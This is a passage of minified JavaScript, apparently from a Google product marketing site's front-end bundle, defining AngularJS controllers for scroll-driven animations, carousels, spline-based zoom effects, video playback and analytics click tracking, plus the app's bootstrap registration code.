$inject(){return["$element","$scope"]}constructor(t,e){this.rl_=de.getDestroyableInstance(),e.$on("$destroy",(()=>this.dispose_())),this.scrollElement=ku(),this.element_=t[0],this.scroll_=_i.getSingleton(this),this.firstRoomEl_=this.element_.querySelector(`.${Lr.ELEVATOR} :first-child`),this.scrollArea_=this.element_.querySelector(`.${Lr.SCROLL_AREA}`),this.elevator_=this.element_.querySelector(`.${Lr.ELEVATOR}`),this.carousel_=this.element_.querySelector(`.${Lr.CAROUSEL}`),this.curtain_=this.element_.querySelector(`.${Lr.CURTAIN}`),this.carouselContainer_=this.element_.querySelector(`.${Lr.CAROUSEL_CONTAINER}`),this.carouselScroller_=this.element_.querySelector(`.${Lr.CAROUSEL_SCROLLER}`),this.rooms_=Array.from(this.element_.querySelectorAll(`.${Lr.ROOM}`)),this.progressPerRoom_=1/(this.rooms_.length+1),this.roomProgressRanges_=Xe.usingFunction((t=>new Ae(t*this.progressPerRoom_,(t+1+eB)*this.progressPerRoom_))),this.roomColors_=Xe.usingFunction((t=>t.getAttribute("data-background-color"))),this.scaleToCarouselRange_=new Ae(1-.9*this.progressPerRoom_,1),this.fadeToCarouselRange_=new Ae(1-.75*this.progressPerRoom_,1-.25*this.progressPerRoom_),this.firstCarouselVideo_=this.element_.querySelector(`.${Lr.END_VIDEO}:nth-child(2)`),this.lastScrolledVideo_=this.elevator_.lastChild,this.endVideos_=Array.from(this.element_.querySelectorAll(`.${Lr.END_VIDEO}`)),this.finalEndVideo_=this.element_.querySelector(`.${Lr.END_VIDEO}:last-child`),this.lastProgress_=-1,this.lastScroll_=-1,this.lastCarouselScroll_=-1,this.lastTransitionScale_=-1,this.firstCarouselVideo_&&this.endVideos_.length&&this.finalEndVideo_&&this.rooms_.length&&this.firstRoomEl_&&this.render_()}updateDimensions_(){this.rl_.measure((()=>{let t=this.firstCarouselVideo_.offsetWidth,e=this.lastScrolledVideo_.offsetWidth,i=t/e;this.lastTransitionScale_!==i&&(this.rl_.mutate((()=>{Ie(this.element_,"--transition-scale",""+t/e)})),this.lastTransitionScale_=i)}))}render_(){this.rl_.measure((()=>{this.rl_.cleanup((()=>this.render_())),!(window.innerHeight<window.innerWidth)&&(this.updateDimensions_(),this.updateProgressValues_(),this.updateCarouselScroll_())}))}updateCarouselScroll_(){let t=this.scroll_.getPosition().getY(),e=this.carouselScroller_.scrollLeft,i=this.carouselContainer_.offsetHeight-4*this.elevator_.offsetHeight,r=this.elevator_.offsetHeight-this.carouselScroller_.offsetHeight,n=new Ae(0,i+r),s=-1*(Ir(this.carouselContainer_)+3*this.carousel_.offsetHeight),o=n.getValueAsPercent(s),a=this.carouselScroller_.scrollWidth-this.carouselScroller_.offsetWidth,l=new Ae(0,a),h=l.getValueAsPercent(e);if(Math.abs(this.lastScroll_-t)>1){let e=l.getPercentAsValue(o);this.lastScroll_=t,this.lastCarouselScroll_=e,this.rl_.mutate((()=>{this.carouselScroller_.scrollLeft=e,Ie(this.carouselScroller_,"--carousel-scroll-x",`${e}px`)}))}else if(Math.abs(this.lastCarouselScroll_-e)>1){this.lastCarouselScroll_=e;let i=n.getPercentAsValue(h),r=Math.floor(i-s);0!==this.scrollArea_&&this.rl_.mutate((()=>{this.scrollElement.scrollTop+=r,Ie(this.carouselScroller_,"--carousel-scroll-x",`${e}px`)})),this.lastScroll_=t+r,this.lastCarouselScroll_=e}}updateProgressValues_(){let t=this.scrollArea_.offsetHeight-this.elevator_.offsetHeight-.1*window.innerHeight,e=new Ae(0,t),i=Ir(this.scrollArea_),r=e.getValueAsPercent(-1*i);r!==this.lastProgress_&&(this.lastProgress_=r,this.updateRooms_(r),this.updateBackgroundColor_(r),this.updateTransitionValues_(r))}updateRooms_(t){for(let e=0;e<this.rooms_.length;e++){let i=this.roomProgressRanges_.get(e).getValueAsPercent(t),r=tB.getAdjustedPercent(Kq.getValueAsPercent(i)),n=Zq.getValueAsPercent(i),s=Jq.getValueAsPercent(i),o=this.rooms_[e];this.rl_.mutate((()=>{Ie(o,"--room-in-progress",`${r+1e-6}`),Ie(o,"--room-out-progress",`${n}`),Ie(o,"--room-fade-progress",`${s}`),Uo(o,Lr.ROOM_ACTIVE,r>=.9)}))}}updateBackgroundColor_(t){let e="transparent";for(let i=0;i<this.rooms_.length;i++){let r=this.roomProgressRanges_.get(i);t>0&&(r.contains(t)||i===this.rooms_.length-1&&t>=r.getMax())&&(e=this.roomColors_.get(this.rooms_[i]))}this.rl_.mutate((()=>Ie(this.curtain_,"background-color",e)))}updateTransitionValues_(t){let e=this.scaleToCarouselRange_.getValueAsPercent(t),i=this.fadeToCarouselRange_.getValueAsPercent(t),r=this.elevator_.offsetHeight,n=1-(Ei(this.elevator_,"--gdn-header-no-unit")+(r-this.finalEndVideo_.offsetHeight)/2)/window.innerHeight;this.rl_.mutate((()=>{Ie(this.element_,"--scale-to-carousel",`${e}`),Ie(this.element_,"--fade-to-carousel",`${i}`),Uo(this.carousel_,Lr.CAROUSEL_ACTIVE,1===t),Uo(this.scrollArea_,Lr.SCROLL_AREA_INACTIVE,e>0),Uo(this.carousel_,Lr.CAROUSEL_VISIBLE,e>0),this.endVideos_.forEach((t=>Uo(t,Lr.END_VIDEO_LOCKED,e>=n)))}))}dispose_(){this.rl_.destroy(),this.scroll_.destroy(this)}},_I=Mm,$m=class{static get $inject(){return["$element","$scope"]}constructor(t,e){this.el=t[0],this.$scope=e,this.toggledCategories_={}}init(t){t.initialValue&&(this.toggledCategories_[t.initialValue]=!0)}toggle(t,e,i){void 0===e&&(e=!this.toggledCategories_[t]),i&&i.closeOthers&&(this.toggledCategories_={}),this.toggledCategories_[t]=e}isToggled(t){return Boolean(this.toggledCategories_[t])}},bI=class{static get $inject(){return["$scope","$element"]}constructor(t,e){this.element_=e[0];let i=this.element_.querySelector("[mqn-tldr-tout-lottie-icon]");this.lottieCtrl_=new Uc(t,angular.element(i))}setHover(t){!this.lottieCtrl_.lottie||(this.lottieCtrl_.lottie.loop=t,t&&this.lottieCtrl_.lottie.play())}},wI=bI,rB={LOCKED:te.mqnCssName("mqn2-drawer-hero--locked")},EI=class{static get $inject(){return["$scope","$element"]}constructor(t,e){this.element_=e[0],this.rl_=de.getDestroyableInstance(),this.videos_=Array.from(this.element_.querySelectorAll("video")),this.bgProgress_=0,this.scrollHandler_=()=>{this.videos_.forEach((t=>{t.readyState>=3?t.play():t.addEventListener("canplay",(()=>t.play()))})),this.maxLoop_(),window.removeEventListener("scroll",this.scrollHandler_)},t.$on("destroy",(()=>this.dispose_()))}init(){this.playOnFirstScroll_()}playOnFirstScroll_(){window.addEventListener("scroll",this.scrollHandler_)}maxLoop_(){this.rl_.measure((()=>{let t=this.videos_.find((t=>Ot(t,!0))),e=t&&t.readyState>=3?t.currentTime/t.duration:0,i=parseFloat(vt(this.element_,"--scroll-progress"));this.bgProgress_=Math.max(e>=i?new Ae(i,e).getPercentAsValue(e):i,this.bgProgress_),1===this.bgProgress_?this.rl_.mutate((()=>this.element_.classList.add(rB.LOCKED))):this.rl_.cleanup((()=>this.maxLoop_())),this.rl_.mutate((()=>Ie(this.element_,"--video-progress",`${e}`)))}))}dispose_(){this.rl_.destroy(),window.removeEventListener("scroll",this.scrollHandler_)}},SI=EI,AI=ye(gt()),CI=ye(Nt()),TI=ye(Jt()),Lm=class{static get $inject(){return["$element","$scope"]}constructor(t,e){this.el=t[0],this.$scope=e,this.ev=TI.elementVisibility.inview(this.el,{}),this.gallery=this.el.querySelector("[card-snap-gallery]"),this.galleryItems=Array.from(this.gallery.querySelectorAll("[card-snap-gallery-item]")),this.index=0,this.itemPositions=[],this.domWatcher=new CI.DomWatcher,this.domWatcher.add({element:window,on:"smartResize",callback:()=>this.onWindowResize()}),this.domWatcher.add({element:this.gallery,on:"scroll",callback:()=>this.onGalleryScroll()}),e.$on("$destroy",(()=>this.dispose_())),this.onWindowResize()}onWindowResize(){this.itemPositions=[],this.galleryItems.forEach(((t,e)=>{let i=this.gallery.scrollLeft-this.gallery.offsetLeft,r=t.getBoundingClientRect().left+i,n=t.offsetWidth,s=this.gallery.offsetWidth;this.itemPositions.push({el:t,x:r,centerX:r-(.5*s-.5*n),width:n})})),this.goTo(0)}onGalleryScroll(){let t=this.gallery.scrollLeft;for(let e=this.itemPositions.length-1;e>=0;e--){if(t>=this.itemPositions[e].x){this.index=e;break}}this.$scope.$$phase||this.$scope.$apply()}goTo(t){t>=this.galleryItems.length&&(t=this.galleryItems.length-1),this.gallery.scroll({left:this.itemPositions[t].centerX,behavior:"smooth"}),AI.dom.playAllVideosInElement(this.galleryItems[t]),this.ev.state().inview&&To(this.el,"tab",this.index)}dispose_(){this.domWatcher.dispose(),this.ev.dispose()}},xI=ye(Jt()),Pn={QUERIES:te.mqnCssName("mqn2-template-opa-inline-queries__queries"),QUERY:te.mqnCssName("mqn2-template-opa-inline-queries__queries__query"),QUERY_ANIMATED:te.mqnCssName("mqn2-template-opa-inline-queries__queries__query--animated"),QUERY_IN:te.mqnCssName("mqn2-template-opa-inline-queries__queries__query--in"),QUERY_OUT:te.mqnCssName("mqn2-template-opa-inline-queries__queries__query--out")},Dm=class{static get $inject(){return["$element","$scope"]}constructor(t,e){this.el=t[0],this.$scope=e;let i=this.el.querySelector(`.${Pn.QUERIES}`);this.looper=new PI(i),e.$on("$destroy",(()=>this.dispose()))}dispose(){this.looper.dispose()}},RI=Dm,II=1e3,iB=1500,PI=class{constructor(t){this.el=t,this.currentIndex=-1,this.started=!1,this.queries=Array.from(this.el.querySelectorAll(`.${Pn.QUERY}`)).map((t=>new OI(t))),this.ev=xI.elementVisibility.inview(this.el,{threshold:1},((t,e,i)=>{e.isIntersecting&&this.start()}))}start(){this.started||(this.started=!0,this.playNext())}playNext(){if(!this.started)return;let t=this.currentIndex;-1!=t&&this.queries[t].animateOut().then((()=>{this.queries[t].reset()}));let e=this.currentIndex+1;e>=this.queries.length&&(e=0),this.queries[e].animateIn().then((()=>this.wait(iB))).then((()=>{this.playNext()})),this.currentIndex=e}stop(){!this.started||(this.started=!1,-1!=this.currentIndex&&this.queries[this.currentIndex].animateOut().then((()=>{this.currentIndex=-1})))}reset(){this.queries.forEach((t=>{t.reset()})),this.currentIndex=-1}wait(t){return new Promise(((e,i)=>{window.setTimeout((()=>e()),t)}))}dispose(){this.stop(),this.ev.dispose()}},OI=class{constructor(t){this.el=t}animateIn(){return new Promise((t=>{this.el.classList.add(Pn.QUERY_ANIMATED),this.el.classList.add(Pn.QUERY_IN),window.setTimeout((()=>t()),II)}))}animateOut(){return new Promise((t=>{this.el.classList.add(Pn.QUERY_ANIMATED),this.el.classList.add(Pn.QUERY_OUT),window.setTimeout((()=>{this.reset(),t()}),II)}))}reset(){this.el.classList.remove(Pn.QUERY_ANIMATED),this.el.classList.remove(Pn.QUERY_IN),this.el.classList.remove(Pn.QUERY_OUT)}},km=ye(fs()),Fm=ye(Zr()),MI=ye(di()),$I=ye(fa()),Nm=ye(en()),LI=ye(Nt()),nB={OFFER:te.mqnCssName("mqn2-custom-zirconium-hero__offer")},Vm=class{static get $inject(){return["$scope","$element"]}constructor(t,e){this.el=e[0],this.$scope=t,this.progress=0,this.domWatcher_=new LI.DomWatcher,this.videoPlayComplete=!1,this.raf=new $I.Raf(this.onRaf.bind(this)),this.raf.runWhenElementIsInview(this.el),this.raf.start(),this.PORTRAIT_SIZE={width:640,height:780},this.container=this.el.querySelector("[mqn-lottie-scroll]"),this.intro=this.el.querySelector("[intro]"),this.portraitElement=this.el.querySelector("[portrait-container]"),this.portraitVideo=this.el.querySelector("[portrait-video]"),this.landscapeElement=this.el.querySelector("[landscape-container]"),this.landscapeVideo=this.el.querySelector("[landscape-video]"),this.lastProgress_=null,this.lastScale_=null,this.initAutotrack(),t.$on("$destroy",(()=>this.dispose()))}initAutotrack(){let t=this.el.querySelectorAll(`.${nB.OFFER} a`),e=Nm.default.getClosestTrackingId(this.el),i={event:"trackEvent",eventCategory:"rebates",eventAction:"rebates message: pdp",eventLabel:"nest_thermostat - rebate message clicked",pageName:window.location.pathname,moduleName:e};for(let e=0;e<t.length;e++){let r=t[e];this.domWatcher_.add({element:r,on:"click",callback:()=>Nm.default.trackDataLayer(i)})}}onRaf(){this.progress=km.dom.getElementScrolledPercent(this.el,window.innerHeight,0),0!==this.progress||this.videoPlayComplete?(this.progress>0&&(this.portraitElement.classList.add("play-complete"),this.landscapeElement.classList.add("play-complete")),this.videoPlayComplete=!0):(Fm.is.isPortrait()?(this.portraitVideo.play(),this.portraitVideo.addEventListener("ended",(()=>this.portraitElement.classList.add("play-complete")),{once:!0})):(this.landscapeVideo.play(),this.landscapeVideo.addEventListener("ended",(()=>this.landscapeElement.classList.add("play-complete")),{once:!0})),this.videoPlayComplete=!0),this.updatePortrait()}updatePortrait(){if(!Fm.is.isPortrait())return;let t=MI.mathf.childProgress(this.progress,0,.35);this.lastProgress_!==this.progress&&(this.raf.write((()=>km.dom.setCssVariables(this.el,{"--portrait-progress":t}))),this.lastProgress_=this.progress)}dispose(){this.raf&&this.raf.dispose(),this.domWatcher_.dispose()}},DI=class{constructor(t,e){this.triggerId_=t,this.target_=e,this.count_=0}getCount(){return this.count_}incrementCount(){this.count_+=1}decrementCount(){this.count_-=1}getElement(){return this.target_}},sB=Hn.usingFunction((([t,e])=>new DI(t,e))),oB=Xe.usingFunction((t=>new Set)),kI=class{constructor(){this.targetCounts_=sB,this.targets_=oB}addTarget(t,e){let i=this.targetCounts_.get([t,e]);i.incrementCount(),this.targets_.get(t).add(i)}disposeTarget(t,e){let i=this.targetCounts_.get([t,e]);i.decrementCount(),i.getCount()<=0&&this.targets_.get(t).delete(i)}getTargets(t){return Array.from(this.targets_.get(t).values())}},FI=kI,Ku=new Je(50,50),aB=64,lB=.5,$s=class{constructor(t,e,i,r,n,s,o,a=Je){this.progressRange_=new Ae(n,s),this.VectorClass_=a;let l=.5,h=$s.getT(l,t,e),c=$s.getT(h,e,i),u=$s.getT(c,i,r);this.path_=[];let d=o*this.progressRange_.getDistance(),p=(c-h)/Math.ceil(d/aB);for(let n=h;n<c-p;n+=p){let s=t.scale((h-n)/(h-l)).add(e.scale((n-l)/(h-l))),o=e.scale((c-n)/(c-h)).add(i.scale((n-h)/(c-h))),a=i.scale((u-n)/(u-c)).add(r.scale((n-c)/(u-c))),d=s.scale((c-n)/(c-l)).add(o.scale((n-l)/(c-l))),p=o.scale((u-n)/(u-h)).add(a.scale((n-h)/(u-h))),m=d.scale((c-n)/(c-h)).add(p.scale((n-h)/(c-h)));this.path_.push(m)}this.path_.push(i),this.pathRange_=new Ae(0,this.path_.length-1)}getPointForProgress(t,e){if(!this.progressRange_.contains(t))throw new Error(`Tried to get point for progress ${t} outside of CatmulRom range ${this.progressRange_.getMin()} to ${this.progressRange_.getMax()}`);let i=this.pathRange_.getPercentAsValue(this.progressRange_.getValueAsPercent(t));if(i<0)return null;if(i%1==0)return this.path_[i];{let t=this.path_[Math.floor(i)],e=this.path_[Math.ceil(i)],r=i%1;return new this.VectorClass_(new Ae(t.getValues()[0],e.getValues()[0]).getPercentAsValue(r),new Ae(t.getValues()[1],e.getValues()[1]).getPercentAsValue(r))}}static getT(t,e,i){let r=Math.pow(i.getValues()[0]-e.getValues()[0],2)+Math.pow(i.getValues()[1]-e.getValues()[1],2),n=Math.pow(r,.5);return Math.pow(n,lB)+t}};function qm(t){return t.toLowerCase().split(" ").join("").split("x").map((t=>parseFloat(t)))}var On=class{constructor(t,e,i,r){this.layer_=e.querySelector(`[mqn2-srz-layer-${i}]`),this.spacer_=e.querySelector(`[mqn2-srz-spacer-${i}]`),this.scale_=On.parseRetargetScale(t.zoom),this.center_=t.center?new Je(...qm(t.center)):null,t.ratio?"auto"===t.ratio?this.ratio_=r:"container"===t.ratio?this.ratio_="container":this.ratio_=new sr(...qm(t.ratio)):this.ratio_=null,this.retargetCenter_=t.retarget_center?new Je(...qm(t.retarget_center)):null,this.retargetScale_=On.parseRetargetScale(t.retarget_scale)}static parseRetargetScale(t){return t?"fill"===t?"fill":parseFloat(t):null}getElement(){return this.layer_}getCenter(){return this.center_}static getCenter(t){return t.getCenter()}getRetargetCenter(){return this.retargetCenter_}static getRetargetCenter(t){return t.getRetargetCenter()}getRatio(t){return"container"===this.ratio_?t:this.ratio_}static getRatio(t,e){return t.getRatio(e)}getRetargetScale(){return this.retargetScale_}static getRetargetScale(t){return t.getRetargetScale()}getScale(){return this.scale_}static getScale(t){return t.getScale()}getSpacerHeight(){return this.spacer_.offsetHeight}},Bm=class{static get $inject(){return["$element","$scope"]}constructor(t,e){this.rl_=de.getDestroyableInstance(),e.$on("$destroy",(()=>this.dispose_())),this.element_=t[0],this.clipEl_=this.element_.querySelector("[mqn2-srz-layers-clip]"),this.transformEl_=this.element_.querySelector("[mqn2-srz-layers-transform]"),this.retargetEl_=this.element_.querySelector("[mqn2-srz-layers-retarget]"),this.autoDimensions_=new sr(parseFloat(this.element_.dataset.autoWidth),parseFloat(this.element_.dataset.autoHeight));let i=JSON.parse(this.element_.dataset.targets);this.targets_=i.map(((t,e)=>new On(t,this.element_,e,this.autoDimensions_))),this.lastProgressValue_=null,this.resizeHandler_=()=>this.handleResize_(),window.addEventListener("resize",this.resizeHandler_),this.handleResize_(),this.render_()}handleResize_(){this.rl_.measure((()=>{Ot(this.element_,!0)?(this.totalSpacerHeight_=this.getTotalSpacerHeight_(),this.targetProgressMap_=this.getTargetProgressMap_(),this.lastProgressValue_=null):(this.totalSpacerHeight_=null,this.targetProgressMap_=null)}))}getTotalSpacerHeight_(){return this.targets_.reduce(((t,e)=>t+e.getSpacerHeight()),0)}getTargetProgressMap_(){let t=0;return this.targets_.reduce(((e,i)=>(t+=i.getSpacerHeight(),e.set(i,t/this.totalSpacerHeight_),e)),new Map)}render_(){this.rl_.measure((()=>{if(this.rl_.cleanup((()=>this.render_())),null===this.targetProgressMap_||(this.containerDimensions_=sr.fromElementOffset(this.clipEl_),!this.containerDimensions_||0===this.containerDimensions_.height))return;let t=Ei(this.element_,"--srz-progress");this.lastProgressValue_!==t&&(this.lastProgressValue_=t,this.adjustMask_(t),this.adjustTransform_(t),this.adjustRetargeting_(t),this.hideUnclippedLayers_())}))}hideUnclippedLayers_(){let t,e=this.clipEl_.getBoundingClientRect(),i=e.width*e.height,r=this.targets_.map((t=>t.getElement())),n=0,s=r.filter((e=>{let r=e.getBoundingClientRect(),s=r.width*r.height;return s>n&&(t=e,n=s),s<i}));s.length===r.length&&_o(s,t);let o=Du(r,s);this.rl_.mutate((()=>{s.map((t=>Ie(t,"opacity","0"))),o.map((t=>Ie(t,"opacity","1")))}))}adjustTransform_(t){let e=this.getSplineVectorValue_(On.getCenter,t,Ku),i=Ku.subtract(e),r=this.getSplineScalarValue_((t=>this.getSRZTargetScale_(t)),t,1);this.rl_.mutate((()=>{Ie(this.transformEl_,"transform",`translate(${i.getX()*r}%, ${i.getY()*r}%) scale(${r})`)}))}adjustMask_(t){let e,i=this.getSplineVectorValue_((t=>t.getRatio(this.containerDimensions_)),t,this.containerDimensions_,sr);if(i.width/i.height>this.clipEl_.offsetWidth/this.clipEl_.offsetHeight){let t=this.clipEl_.offsetWidth/i.width,r=(this.clipEl_.offsetHeight-i.height*t)/2/this.clipEl_.offsetHeight,n=this.clipEl_.offsetHeight*r,s=this.clipEl_.offsetHeight*(1-r);e=`rect(${n}px, ${this.clipEl_.offsetWidth}px, ${s}px, 0)`}else{let t=this.clipEl_.offsetHeight/i.height,r=(this.clipEl_.offsetWidth-i.width*t)/2/this.clipEl_.offsetWidth,n=this.clipEl_.offsetWidth*r;e=`rect(0, ${this.clipEl_.offsetWidth*(1-r)}px, ${this.clipEl_.offsetHeight}px, ${n}px)`}this.rl_.mutate((()=>Ie(this.clipEl_,"clip",e)))}adjustRetargeting_(t){let e=Ku.subtract(this.getSplineVectorValue_(On.getRetargetCenter,t,Ku)),i=this.getSplineScalarValue_(On.getRetargetScale,t,1);this.rl_.mutate((()=>{Ie(this.retargetEl_,"transform",`translate(${e.getX()}%, ${e.getY()}%) scale(${i})`)}))}getSRZTargetScale_(t){let e=On.getScale(t);if("fill"===e){let t=this.containerDimensions_,e=this.autoDimensions_,i=e.height*t.width/e.width;return i<t.height?t.height/i:1}return e}getSplineVectorValue_(t,e,i,r=Je){let n=this.targets_.filter((e=>null!==t(e)));if(0===n.length)return i;if(0===e)return t(n[0]);if(1===e)return t(n[n.length-1]);if(1===n.length)return t(n[0]);if(2===n.length){let i=n[0],r=n[1],s=this.targetProgressMap_.get(i),o=this.targetProgressMap_.get(r);if(e<=s)return t(i);if(e>=o)return t(r);{let n=new Ae(s,o).getValueAsPercent(e),a=t(i),l=t(r);return a.scale(1-n).add(l.scale(n))}}if(3===n.length){let s,o,a,l=n.map((e=>t(e)));if(e<this.targetProgressMap_.get(n[1])){let t=l[1].subtract(l[0]);s=[l[0].subtract(t),l[0],l[1],l[2]],o=this.targetProgressMap_.get(n[0]),a=this.targetProgressMap_.get(n[1])}else{let t=l[2].subtract(l[1]);s=[l[0],l[1],l[2],l[2].add(t)],o=this.targetProgressMap_.get(n[1]),a=this.targetProgressMap_.get(n[2])}let h=new $s(...s,o,a,this.totalSpacerHeight_,r).getPointForProgress(e,this.element_);return null!==h?h:i}{let s,o,a,l=0;for(let t=1;t<n.length&&e>this.targetProgressMap_.get(n[t]);t++)l=t;if(0===l){let e=n.slice(0,3).map((e=>t(e))),i=e[1].subtract(e[0]);s=[e[0].subtract(i),...e],o=0,a=this.targetProgressMap_.get(n[1])}else if(l+2>=n.length){let e=n.slice(-3).map((e=>t(e))),i=e[2].subtract(e[1]);s=[...e,e[2].add(i)],o=this.targetProgressMap_.get(n[n.length-2]),a=1}else s=n.slice(l-1,l+3).map((e=>t(e))),o=this.targetProgressMap_.get(n[l]),a=this.targetProgressMap_.get(n[l+1]);let h=new $s(...s,o,a,this.totalSpacerHeight_,r).getPointForProgress(e,this.element_);return null!==h?h:i}}getSplineScalarValue_(t,e,i){return this.getSplineVectorValue_((e=>null!==t(e)?new Je(t(e),t(e)):null),e,new Je(i,i)).getX()}dispose_(){window.removeEventListener("resize",this.resizeHandler_),this.rl_.destroy()}},NI=Bm,VI="template_tab_carousel",qI=class{static get $inject(){return["$rootScope","$element","$scope","$compile"]}constructor(t,e,i,r){this.el=e[0],this.initialized=!1,i.$on("MQN_SLICK_INITIALIZED",this.slickInitialized.bind(this)),i.$on("MQN_SLICK_INVIEW",this.slickInview.bind(this))}slickInitialized(t,e){this.initialized||e.id!==VI||(this.slickCtrl=e.ctrl,this.initialized=!0)}slickInview(t,e){e.id===VI&&(e.inview?this.slickCtrl.start():this.slickCtrl.stop())}},BI=qI,WI=class{constructor(){this.elementsToControllers_=new Map}get(t){return this.elementsToControllers_.get(t)}register(t,e){this.elementsToControllers_.set(t,e)}deregister(t){this.elementsToControllers_.delete(t)}},UI=WI,Zu={ENTER:"DOMContentLoaded",LOAD:"load",TRACKING_NAVIGATION:"trackingNavigationEvent",LEAVE:"mannequinImpendingNavigation"};ct.getSingleton().overrideThrow((t=>{if(-1!==window.location.origin.indexOf("localhost"))throw new Error(t);console.warn(t)}));var GI=class{constructor(){this.apps=[],this.rootElements=[],this.forcePassiveJQuery(),this.destroyed_=!1,document.addEventListener(Zu.ENTER,this.handleLoad.bind(this),{once:!0}),document.addEventListener(Zu.TRACKING_NAVIGATION,this.handleTrackingNavigation.bind(this)),$d.setupNativeSmoothScroll()}forcePassiveJQuery(){window.jQuery&&(jQuery.event.special.touchstart={setup:function(t,e,i){e.includes("noPreventDefault")?this.addEventListener("touchstart",i,{passive:!1}):this.addEventListener("touchstart",i,{passive:!0})}},jQuery.event.special.touchmove={setup:function(t,e,i){e.includes("noPreventDefault")?this.addEventListener("touchmove",i,{passive:!1}):this.addEventListener("touchmove",i,{passive:!0})}})}handleLoad(){this.handleDOMContentLoaded(),document.addEventListener(Zu.ENTER,this.handleDOMContentLoaded.bind(this)),document.addEventListener(Zu.LEAVE,this.handleDestroy.bind(this))}handleTrackingNavigation(){window.MQN2_TRACKING_NAVIGATION_READY=!0}handleDOMContentLoaded(){this.loading||(this.loading=!0,window.dispatchEvent(new Event("mannequinInternalStartInstantiation")),Ry(),this.createAngularApps(),this.modal_=new $b,this.createAirkitModal(),this.rewriteGoogleUrls())}handleDestroy(){this.loading=!1,window.MQN2_TRACKING_NAVIGATION_READY=!1,this.destroyAngularApps(),this.destroyAirkitModal(),document.documentElement.style.overflow="",document.body.style.height="",document.body.style.width="",document.body.style.overflow="",document.body.style.marginTop="",$d.disposeNativeSmoothScroll()}rewriteGoogleUrls(){let t=document.querySelectorAll(['[mqn2-app] a[href^="https://apps.apple.com"]','[mqn2-app] a[href^="https://one.google.com"]','[mqn2-app] a[href^="https://play.google.com"]','[mqn2-app] a[href^="https://safety.google"]','[mqn2-app] a[href^="https://support.google.com"]'].join(", "));[].forEach.call(t,(function(t){t.target="_blank"}))}createAirkitModal(){this.modal_.createAirkitModal()}destroyAirkitModal(){this.modal_.destroyAirkitModal()}createAngularApp(t){if(Wm.default.module("mqn2",["ngSanitize","ngTouch","ngAria"]).config(["$interpolateProvider",function(t){t.startSymbol("[[").endSymbol("]]")}]).controller("mqnAtMoveController",US).controller("mqnChromecastAppsController",HS).controller("mqnPickerController",jS).controller("mqnCarousel2Controller",tA).controller("mqnEqualHeightsController",sA).controller("mqnSlickController",Ao).controller("mqnSlideshowController",aT).controller("mqnPerfectScrollerController",sT).controller("mqnPartnersGridController",vC).controller("mqnGridAppsController",aA).controller("mqnGridDrawersController",kp).controller("mqnPdpTogglerController",CC).controller("mqnTemplateProductComparisonController",MC).controller("mqnTemplateLottieElevatorController",Zp).controller("mqnTemplateLockedScreenController",zC).controller("mqnModalController",uA).controller("mqnAppGardenController",pu).controller("mqnAppGardenGridController",ZS).controller("mqnMaskedHeroController",Am).controller("mqnMtSpeedSecurityController",Px).controller("mqnMtSmartSpeakersController",kx).controller("mqnMtHardwareController",Wx).controller("mqnMtQuizController",Ax).controller("mqnMtSoftwareController",zx).controller("mqnNwCamController",fA).controller("mqnNwConnectController",mA).controller("mqnNwFacematchController",yA).controller("mqnTemplateTabCarouselController",BI).controller("mqnNwHomeController",wA).controller("mqnNwPhotos2Controller",AA).controller("mqnNwScrollSpeakersController",MA).controller("mqnNwStreamController",fC).controller("mqnStHeroController",uT).controller("mqnParallaxCarouselController",mC).controller("mqnRetailersController",fT).controller("mqnTechspecsHeroController",pT).controller("mqnProductWallController",yT).controller("mqnRoomToRoomPortraitController",_I).controller("mqnRoomToRoomLandscapeController",vI).controller("mqnFootstepsController",xT).controller("mqnWombatController",gx).controller("mqnWombatSlickController",yx).controller("mqnTemplateCarouselController",wx).controller("mqnValChController",Qx).controller("mqnValDbController",tI).controller("mqnValEntertainmentController",nI).controller("mqnSuperResZoomController",NI).controller("mqnTldrToutController",wI).controller("mqnVideoGridController",aI).controller("mqnCountdownController",Mp).controller("mqnDrawerHeroController",SI).controller("mqnPremiumSoundSubsController",cI).controller("mqnPremiumSoundCirclesController",fI).controller("mqnAccordionController",$m).controller("mqnCardSnapGallery",Lm).controller("mqnOpaInlineQueriesController",RI).controller("mqnZRHeroController",Vm).directive("mqnLottieScroll",HI.lottieScrollDirective).directive("mqnAccessibleOutline",O0).directive("mqnAddBrowserName",F0).directive("mqnAutotrack",q0).directive("mqnAutotrackDecorator",B0).directive("mqnBlurryVideo",H0).directive("mqnInview",Ew).directive("mqnClickAnimation",tw).directive("mqnVideoCssTriggers",hE).directive("mqnVideoIntroLoop",_E).directive("mqnVideoInviewPlay",pE).directive("mqnVideoPlayOnHover",vE).directive("mqnDynamicCta",Vd).directive("mqnDynamicPricing",qd).directive("mqnHorizontalScroll",yw).directive("mqnLottie",Ud).directive("mqnMinHeight",Xw).directive("mqnRewriteLinkTargets",sE).directive("mqnElevator",aw).directive("mqnBreakpointStyle",ew).directive("mqnBreakpointClass",z0).directive("mqnSwipe",oE).directive("mqnParallax",nE).directive("mqnLazyimage",Cw).directive("mqn2ScrubOnFramePosition",EE).directive("mqnNativeSticky",Zw).directive("mqnCssParallax",xS).directive("mqnVisibilityOptimizer",PS).directive("mqnVideoCssTriggersTarget",AE).directive("mqnGridWithDeviceImagesMetaOffset",TE).directive("mqn2LerpedScrolledFrameSequence",jw).directive("mqn2SectionBreakerHeader",yS).directive("mqn2WombatDataAttrs",OS).directive("mqnGdnHeight",fw).directive("mqnWindowAspectRatio",MS).directive("mqnElementDimensions",RS).directive("mqnHeightToVar",gw).directive("mqnViewInAr",Qw).directive("mqnTabindexGroup",bp).directive("mqnScrollToCenterOnFocus",VS).directive("mqnAutotrackGdnLinks",FS).service("mqnTemplateLottieElevatorService",UI).service("mqnVideoCssTriggerTargetCollection",FI).run(["$rootScope",t=>{t.isMobile=rt.isMobile,t.isTabletOrMobile=rt.isTabletOrMobile,t.isDesktopOrTablet=rt.isDesktopOrTablet,t.isDesktop=rt.isDesktop,t.isLandscape=rt.isLandscape,t.isPortrait=rt.isPortrait,window.addEventListener("resize",(()=>{t.$$phase||t.$apply()}))}]),t.getAttribute("bootstrapped"))return;let e;t.setAttribute("bootstrapped",!0);try{e=Wm.default.bootstrap(t,["mqn2"])}catch(t){console.warn(t)}return e}createAngularApps(){let t=document.querySelectorAll("[mqn2-app]"),e=window.innerHeight;this.watchers_=[],this.apps=[],this.rootElements=[],[...t].forEach(((t,i)=>{if(null!==t.getAttribute("data-delay-instantiation")){let 